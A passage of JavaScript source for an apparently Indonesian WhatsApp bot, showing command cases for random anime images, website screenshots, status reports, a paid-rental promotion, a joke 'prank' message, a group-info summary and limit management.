case 'madara': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { madara } = require('./media/anime/madara') 
let madaranya = madara[Math.floor(Math.random() * madara.length)]
Al.sendMessage(m.chat, { image: { url: madaranya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
 case 'megumin': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { megumin } = require('./media/anime/megumin') 
let meguminnya = megumin[Math.floor(Math.random() * megumin.length)]
Al.sendMessage(m.chat, { image: { url: meguminnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'menus': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { menus } = require('./media/anime/menus') 
let menusnya = menus[Math.floor(Math.random() * menus.length)]
Al.sendMessage(m.chat, { image: { url: menusnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'mikasa': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { mikasa } = require('./media/anime/mikasa') 
let mikasanya = mikasa[Math.floor(Math.random() * mikasa.length)]
Al.sendMessage(m.chat, { image: { url: mikasanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'miku': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { miku } = require('./media/anime/miku') 
let mikunya = miku[Math.floor(Math.random() * miku.length)]
Al.sendMessage(m.chat, { image: { url: mikunya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'minato': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { minato } = require('./media/anime/minato') 
let minatonya = minato[Math.floor(Math.random() * minato.length)]
Al.sendMessage(m.chat, { image: { url: minatonya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'naruto': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { naruto } = require('./media/anime/naruto') 
let narutonya = naruto[Math.floor(Math.random() * naruto.length)]
Al.sendMessage(m.chat, { image: { url: narutonya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'natsukawa': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { natsukawa } = require('./media/anime/natsukawa') 
let natsukawanya = natsukawa[Math.floor(Math.random() * natsukawa.length)]
Al.sendMessage(m.chat, { image: { url: natsukawanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'nezuko': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { nezuko } = require('./media/anime/nezuko') 
let nezukonya = nezuko[Math.floor(Math.random() * nezuko.length)]
Al.sendMessage(m.chat, { image: { url: nezukonya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'nishimiya': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { nishimiya } = require('./media/anime/nishimiya') 
let nishimiyanya = nishimiya[Math.floor(Math.random() * nishimiya.length)]
Al.sendMessage(m.chat, { image: { url: nishimiyanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'onepiece': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { onepiece } = require('./media/anime/onepiece') 
let onepiecenya = onepiece[Math.floor(Math.random() * onepiece.length)]
Al.sendMessage(m.chat, { image: { url: onepiecenya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'pokemon': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { pokemon } = require('./media/anime/pokemon') 
let pokemonnya = pokemon[Math.floor(Math.random() * pokemon.length)]
Al.sendMessage(m.chat, { image: { url: pokemonnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'rem': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { rem } = require('./media/anime/rem') 
let remnya = rem[Math.floor(Math.random() * rem.length)]
Al.sendMessage(m.chat, { image: { url: remnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'rize': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { rize } = require('./media/anime/rize') 
let rizenya = rize[Math.floor(Math.random() * rize.length)]
Al.sendMessage(m.chat, { image: { url: rizenya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'sagiri': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { sagiri } = require('./media/anime/sagiri') 
let sagirinya = sagiri[Math.floor(Math.random() * sagiri.length)]
Al.sendMessage(m.chat, { image: { url: sagirinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'sakura': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { sakura } = require('./media/anime/sakura') 
let sakuranya = sakura[Math.floor(Math.random() * sakura.length)]
Al.sendMessage(m.chat, { image: { url: sakuranya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'sasuke': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { sasuke } = require('./media/anime/sasuke') 
let sasukenya = sasuke[Math.floor(Math.random() * sasuke.length)]
Al.sendMessage(m.chat, { image: { url: sasukenya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'shina': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { shina } = require('./media/anime/shina') 
let shinanya = shina[Math.floor(Math.random() * shina.length)]
Al.sendMessage(m.chat, { image: { url: shinanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'shinka': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { shinka } = require('./media/anime/shinka') 
let shinkanya = shinka[Math.floor(Math.random() * shinka.length)]
Al.sendMessage(m.chat, { image: { url: shinkanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'shizuka': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { shizuka } = require('./media/anime/shizuka') 
let shizukanya = shizuka[Math.floor(Math.random() * shizuka.length)]
Al.sendMessage(m.chat, { image: { url: shizukanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'shota': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { shota } = require('./media/anime/shota') 
let shotanya = shota[Math.floor(Math.random() * shota.length)]
Al.sendMessage(m.chat, { image: { url: shotanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'simp': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { simp } = require('./media/anime/simp') 
let simpnya = simp[Math.floor(Math.random() * simp.length)]
Al.sendMessage(m.chat, { image: { url: simpnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'tomori': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { tomori } = require('./media/anime/tomori') 
let tomorinya = tomori[Math.floor(Math.random() * tomori.length)]
Al.sendMessage(m.chat, { image: { url: tomorinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'toukachan': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { toukachan } = require('./media/anime/toukachan') 
let toukachannya = toukachan[Math.floor(Math.random() * toukachan.length)]
Al.sendMessage(m.chat, { image: { url: toukachannya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'tsunade': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { tsunade } = require('./media/anime/tsunade') 
let tsunadenya = tsunade[Math.floor(Math.random() * tsunade.length)]
Al.sendMessage(m.chat, { image: { url: tsunadenya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
 case 'yatogami': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { yatogami } = require('./media/anime/yatogami') 
let yatogaminya = yatogami[Math.floor(Math.random() * yatogami.length)]
Al.sendMessage(m.chat, { image: { url: yatogaminya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'yuki': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { yuki } = require('./media/anime/yuki') 
let yukinya = yuki[Math.floor(Math.random() * yuki.length)]
Al.sendMessage(m.chat, { image: { url: yukinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'totalfitur':
case 'totalfeature':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let fitur = `
*TOTAL FEATURE*

• BerJumlah ${totalFitur()} Fitur\n*Tipe :* Case

Silahkan ketik *.menu* untuk
Menampilkan menu utama`
m.reply(fitur)
}
break
case 'ssweb2': case 'ssweb': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!args[0]) return m.reply(`Gunakan dengan cara ${prefix+command} type *url web*\n\nList type:\n1.hp\n2.pc\n3.tab\n\nContoh penggunaan : ${prefix+command} hp https://bit.ly/420u6GX`)
if (!args[1]) return m.reply(`Gunakan dengan cara ${prefix+command} type *url web*\n\nList type:\n1.hp\n2.pc\n3.tab\n\nContoh penggunaan : ${prefix+command} hp https://bit.ly/420u6GX`)
if (args[0] === 'hp'){
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!args[1]) return m.reply(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
m.reply('_Loading..._')
let ss = await getBuffer(`https://widipe.com/sshp?url=${args[1]}`)
try{
await Al.sendMessage(m.chat, {image: ss, caption: "Done Bruhh"}, {quoted: m})
} catch (err){
m.reply(util.format(err))
}
if (!isCreator && !isPremium) { giveLimit(m.sender, limit) }
 } else 
 if (args[0] === 'pc'){
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!args[1]) return m.reply(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
m.reply('_Loading..._')
let ss = await getBuffer(`https://widipe.com/sspc?url=${args[1]}`)
try{
await Al.sendMessage(m.chat, {image: ss, caption: "Done Bruhh"}, {quoted: m})
} catch (err){
m.reply(util.format(err))
}
if (!isCreator && !isPremium) { giveLimit(m.sender, limit) }
 } else 
 if (args[0] === 'tab'){
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!args[1]) return m.reply(`Gunakan dengan Cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
m.reply('_Loading..._')
let ss = await getBuffer(`https://widipe.com/sstab?url=${args[1]}`)
try{
await Al.sendMessage(m.chat, {image: ss, caption: "Done Kak"}, {quoted: m})
} catch (err){
m.reply(util.format(err))
}
if (!isCreator && !isPremium) { giveLimit(m.sender, limit) }
}else { 
 m.reply(`Mau Type Apa Luwh?\n\n1. Hp\n2. Pc\n3. Tab\n\n*Contoh :* ${prefix + command} hp _url_`)}
}
break
case 'myip':
            case 'ipbot':
            if (!isRegistered) return terdaftar()
            if (isBan) return terbanned()
                if (!isCreator) return m.reply('Lu Bau')
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        m.reply("🔎 My public IP address is: " + ip);
                    })
                })
            break
case 'ram':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const os = require('os');
let total = (os.totalmem() / (1024 * 1024 * 1024)).toFixed(0)
let free = (os.freemem() / (1024 * 1024 * 1024)).toFixed(0)
let used = total-free
let persen = ((used / total) * 100).toFixed(0)
aiRep(`RAM yang digunakan: ${persen} %`)
}
break            
//========================
case 'Hi': {
let teks = `Hi How Are You *${pushname} ?*`
m.reply(teks)
}
break
//========================
case 'Good Night': case 'Good night': case 'good night': case 'gn': {
let teks = `*_🌙...Good Night...💗_*`
m.reply(teks)
}
break
//========================
case 'Good Morning': case 'Good moaning': case 'good morning': case 'gm': {
let teks = `*_☀...Good Morning...💗_*`
m.reply(teks)
}
break
//========================
case 'Good night': {
let teks = `*_🌙...Good Night...💗_*`
m.reply(teks)
}
break
//========================
case 'Group morning': {
let teks = `*_☀...Good Morning...💗_*`
m.reply(teks)
}
break
//========================

//========================

//========================

//========================

//========================
case 'sewa': {
  await Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }});
  const url = "https://telegra.ph/file/72b973058c1985de0eda8.jpg";

  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: Al.waUploadToServer
    });
    return imageMessage;
  }

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `𝚂𝙴𝚆𝙰 𝙱𝙾𝚃 || 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙾𝚃\n\nᒍᗩᑎGᗩᑎ ᒪᑌᑭᗩ ᒍOIᑎ YᗩKK,, Gᖇᑌᑭ 𝐌𝐚𝐧𝐮-𝐌𝐃 💙\nhttps://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n𝙰𝚛𝚒𝚐𝚊𝚝𝚘𝚞 𝙶𝚘𝚣𝚊𝚒𝚖𝚊𝚜𝚞 💙.`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg' } }, { upload: Al.waUploadToServer })),
                    title: ``,
                    gifPlayback: true,
                    subtitle: "𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭",
                    hasMediaAttachment: false
                  }),
                  body: { text: `</> 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙾𝚃 </>\n\n> *15 Days : 5.000*\n> *30 Days : 10.000*\n> *60 Days : 20.000*\n> *90 Days : 30.000*\n\n</> 𝙱𝙴𝙽𝙴𝙵𝙸𝚃 𝙿𝚁𝙴𝙼 </>
\n> Get Unlimited Limit\n> Get Acces Premium Fitur\n> Dll..\nOrder Here!\n\n𝘽𝙀 𝘼 𝙎𝙈𝘼𝙍𝙏 𝙐𝙎𝙀𝙍.`},
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"👤 𝙾𝚆𝙽𝙴𝚁\",\"url\":\"https://wa.me/94742274855?text=*ʜɪ+ᴍʀ+ᴄʏʙᴇʀ+ᴍᴀɴᴜʟ+ᴏꜰꜰɪᴄɪᴀʟ+ꜱɪʀ.🫡💗*\",\"merchant_url\":\"https://www.google.com\"}"
                      },
                      {
                       "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"⛅ 𝙸𝙽𝙵𝙾 𝙼𝙰𝙽𝚄-𝙼𝙳\",\"url\":\"https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\",\"merchant_url\":\"https://www.google.com\"}"
                       },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg' } }, { upload: Al.waUploadToServer })),
                    title: ``,
                    gifPlayback: true,
                    subtitle: "𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭",
                    hasMediaAttachment: false
                  }),
                  body: { text: `</> 𝚂𝙴𝚆𝙰 𝙼𝙰𝙽𝚄-𝙼𝙳 </>\n\n> *15 Days : 7.000*\n> *30 Days : 15.000*\n> *60 Days : 30.000*\n> *90 Days : 45.000*\n\n</> 𝙱𝙴𝙽𝙴𝙵𝙸𝚃 𝚂𝙴𝚆𝙰 </>
\n> Furina Chat\n> Fitur Supp Gc\n> Dll..\nOrder Here!\n\n𝘽𝙀 𝘼 𝙎𝙈𝘼𝙍𝙏 𝙐𝙎𝙀𝙍.`},
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"👤 𝙾𝚆𝙽𝙴𝚁\",\"url\":\"https://wa.me/94742274855?text=*ʜɪ+ᴍʀ+ᴄʏʙᴇʀ+ᴍᴀɴᴜʟ+ᴏꜰꜰɪᴄɪᴀʟ+ꜱɪʀ.🫡💗*\",\"merchant_url\":\"https://www.google.com\"}"
                      },
                      {
                      	"name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"⛅ 𝙸𝙽𝙵𝙾 𝙼𝙰𝙽𝚄-𝙼𝙳\",\"url\":\"https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\",\"merchant_url\":\"https://www.google.com\"}"
                        },
                    ],
                  },
                }
              ],
                        messageVersion: 1,
                          },
                         contextInfo: {
                         mentionedJid: [m.sender],
                         forwardingScore: 999,
                         isForwarded: true,
                         forwardedNewsletterMessageInfo: {
                         newsletterJid: '120363232588171807@newsletter',
                         newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
                         serverMessageId: 143
                            }
                        }
                    }
                }
            },
        },
        { quoted: m });
        
    await Al.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break
//========================
case 'runtime': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let teks = `*Runtime :* ${runtime(process.uptime())}`
m.reply(teks)
}
break
//========================
case 'bot': {
responbot()
await Al.sendMessage(m.chat, { react: { text: "❓",key: m.key,}})   
}
break
//========================
case 'aibotzz': 
case 'aibotz': 
case 'furina': {
responbot()
await Al.sendMessage(m.chat, { react: { text: "❓",key: m.key,}})   
}
break
//========================
case '@94742274855': 
case 'wann': 
case 'Wann1': 
case 'bang Wann': 
case 'Bang Wan': 
case 'bg Wann': 
case 'bang Wann': 
case 'bng Wann': 
case 'bg Wann': {
Al.sendMessage(m.chat, {sticker: fs.readFileSync('./media/sticker/bejir.webp')}, {quoted: m})
}
break
//========================
case 'prank': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let fitur = `
~ Mark mengeluarkan Anda
ㅤㅤ
ㅤㅤ
ㅤㅤ
ㅤㅤ
ㅤㅤ
ㅤㅤ
ㅤㅤ
ㅤㅤ
ㅤㅤ
Cie kena prank, wkwk

`
Al.relayMessage(m.chat, {
		scheduledCallCreationMessage: {
		callType: "AUDIO",
		scheduledTimestampMs: 1,
		title: fitur, 
		}
	}, {})
                }                
break
//========================
case 'grupinfo':
case 'grubinfo':
case 'gcinfo':
case 'infogc': 
case 'infogrub':
case 'infogrup': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let admin = groupMetadata.participants.filter(p => p.admin)
let listAdmin = admin.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
let listMem = participants.map((v, i) => `${i + 1}. ${v.id.split('@')[0]}`).join('\n')
let ppgc = await Al.profilePictureUrl(from, 'image')
let bejir = `
*NAMA GRUB*
• ${groupName}

*JUMLAH ADMIN*
• ${admin.length} Admin grup

*JUMLAH MEMBER*
• ${groupMetadata.participants.length} Member grup

*KIRIM PESAN*
• ${groupMetadata.announce ? 'Hanya Admin' : 'Semua Peserta'}

*EDIT INFO GRUB*
• ${groupMetadata.restrict ? 'Hanya Admin' : 'Semua Peserta'}

*ADD MEMBER GRUB*
• ${groupMetadata.addmembers ? 'Hanya Admin' : 'Semua Peserta'}

*SETUJUI MEMBER BARU*
• ${groupMetadata.approvenewmembers ? 'Di Setujui' : 'Tidak disetujui'}

*DESKRIPSI GRUB*
———————————————————
${groupMetadata.desc}
———————————————————

*OWNER GRUB*
• ${groupMetadata.owner}

*ID GRUB*
• ${groupMetadata.id}

*DIBUAT PADA*
• ${moment(groupMetadata.creation * 1000).format('DD/MM/YY HH:mm:ss')}

*LIST ADMIN GRUB*
\n${listAdmin}\n
———————————————————
      *A N T I  &  A U T O*
———————————————————
*ANTI LINK ALL* : ${isAntiLAll ? 'Aktif' : 'Nonaktif'}

*ANTI LINK* : ${isAntiLink ? 'Aktif' : 'Nonaktif'}

*ANTI PROMOSI* : ${isAntiPromo ? 'Aktif' : 'Nonaktif'}

*ANTI TOXIC* : ${isAntiToxic ? 'Aktif' : 'Nonaktif'}

*ANTI FOTO* : ${isAntiFoto ? 'Aktif' : 'Nonaktif'}

*ANTI AUDIO* : ${isAntiAudio ? 'Aktif' : 'Nonaktif'}

*ANTI VIDEO* : ${isAntiVideo ? 'Aktif' : 'Nonaktif'}

*ANTI STICKER* : ${isAntiSticker ? 'Aktif' : 'Nonaktif'}

*ANTI DOKUMEN* : ${isAntiDoc ? 'Aktif' : 'Nonaktif'}

*ANTI LOKASI* : ${isAntiLoc ? 'Aktif' : 'Nonaktif'}

*ANTI KONTAK* : ${isAntiCon ? 'Aktif' : 'Nonaktif'}

*ANTI TEKS* : ${isAntiTeks ? 'Aktif' : 'Nonaktif'}

*ANTI VIEW ONCE* : ${isAntiVo ? 'Aktif' : 'Nonaktif'}

*ANTI WAME* : ${isAntiWame ? 'Aktif' : 'Nonaktif'}

*ANTI LINK YT VID* : ${isAntiLinkYoutubeVid ? 'Aktif' : 'Nonaktif'}

*ANTI LINK YT CH* : ${isAntiLinkYoutubeChannel ? 'Aktif' : 'Nonaktif'}

*ANTI LINK TT* : ${isAntiLinkTiktok ? 'Aktif' : 'Nonaktif'}

*ANTI LINK FB* : ${isAntiLFb ? 'Aktif' : 'Nonaktif'}

*ANTI LINK IG* : ${isAntiLIg ? 'Aktif' : 'Nonaktif'}

*ANTI LINK TELE* : ${isAntiLTele ? 'Aktif' : 'Nonaktif'}

*ANTI LINK TWT* : ${isAntiLTwt ? 'Aktif' : 'Nonaktif'}

*ANTI LINK SFILE* : ${isAntiLSfile ? 'Aktif' : 'Nonaktif'}

*ANTI LINK DC* : ${isAntiLDc ? 'Aktif' : 'Nonaktif'}

*ANTI VIRTEX* : ${isAntiVirtex ? 'Aktif' : 'Nonaktif'}

*AUTO DLGC* : ${isAutoDlGc ? 'Aktif' : 'Nonaktif'}

*AUTO STICKER* : ${isAutoStiker ? 'Aktif' : 'Nonaktif'}

———————————————————
     *W L C  AND  L E F T*
———————————————————
*WLC FEATURE* : ${isWelcome ? 'Aktif' : 'Nonaktif'}

*LEFT FEATURE* : ${isLeft ? 'Aktif' : 'Nonaktif'}

———————————————————
*FITUR NSFW* : ${AntiNsfw ? 'Aktif' : 'Nonaktif'}

———————————————————
*STATUS KAMU*
• ${isAdmins ? 'Sebagai Admin grup' : 'Sebagai Member biasa'}

*STATUS BOT*
• ${isBotAdmins ? 'Sebagai Admin grup' : 'Sebagai Member biasa'}

*MY RESPON*\n• ${isResponx ? 'Respon diaktifkan' : 'Respon dinonaktifkan'}\n\n*LIST MEMBER & ADMIN*\n\n${listMem}\n`
Al.sendMessage(m.chat, {image: {url: ppgc }, caption: bejir }, {quoted: m})
}
break
//========================
case 'givelimit1': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (!text) return m.reply('*Enter Jumlah Limit Yang Akan Diberi*')
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) return m.reply('*Tag Orangnya*')
    let txt = text.replace('@' + who.split`@`[0], '').trim()
    if (isNaN(txt)) return m.reply('*Hanya Angka*')
    let poin = parseInt(txt)
    let limit = poin
    if (limit < 1) return m.reply('*Minimal 1*')
    let user = global.db.users
    user[who].limit += poin
    if (limit > 9999999) return m.reply('*Kebanyakan*') 
    Al.sendMessage(m.chat, {text: `📧 *Selamat @${who.split`@`[0]}. Kamu Mendapatkan +${poin} Limit!*`}, {quoted:m})
    }
break
//========================
case 'del1': case 'delete1': case 'd1': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.quoted) return m.reply('Reply pesan yang ingin dihapus!')
if (!isCreator && !isPremium) return m.reply('Lu bukan premium')
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isBotAdmins) return m.reply('Gua bukan admin Tod')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
}
break
//========================
case 'igemoji':
case 'instagramemoji': 
if (!q) return m.reply("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "11")
break
//========================
case 'iphoneemoji':
if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "0")
break
//========================
case 'googleemoji':
if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "1")
break
//========================
case 'samsungemoji':
if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "2")
break
//========================
case 'microsoftemoji':
if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "3")
break
//========================
case 'whatsappemoji':
if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "4")
break
//========================
case 'twitteremoji':
if (!q) return m.reply("Masukan emoji, maxnya yaitu 1 emoji... oke?" + ` ${prefix + command} 😀`)
m.reply('_Tunggu..._')
emote(q, "5")
break
//========================
case 'facebookemoji':
case 'fbemoji': 
